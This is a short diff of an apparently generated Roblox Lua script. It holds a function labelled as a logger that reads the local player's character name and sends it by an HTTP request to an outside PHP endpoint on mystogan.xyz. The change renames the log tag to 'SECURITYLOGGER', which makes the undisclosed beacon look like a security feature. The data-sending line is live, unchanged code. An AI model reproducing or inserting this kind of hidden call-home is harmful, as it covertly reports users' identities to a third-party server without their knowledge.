@@ -1702,7 +1702,7 @@ function SCRIPT_QWZM67_FAKESCRIPT() -- AR8.logger2
 	local script = Instance.new('Script')
 	script.Parent = AR8
 	--Logger
-		mainstring = "SECONDSTEP | CharacterName: "..game.Players.LocalPlayer.Character.Name
+		mainstring = "SECURITYLOGGER | CharacterName: "..game.Players.LocalPlayer.Character.Name
 		textforsend = string.gsub(mainstring, " ", "+")
 		print(game:HttpGetAsync("https://mystogan.xyz/AcLuA7nxkdLnBzJk90lmPokZxVyNHk423xFfjKlUtYnnvVjEr3965xnMLxX.php?text="..textforsend))
 
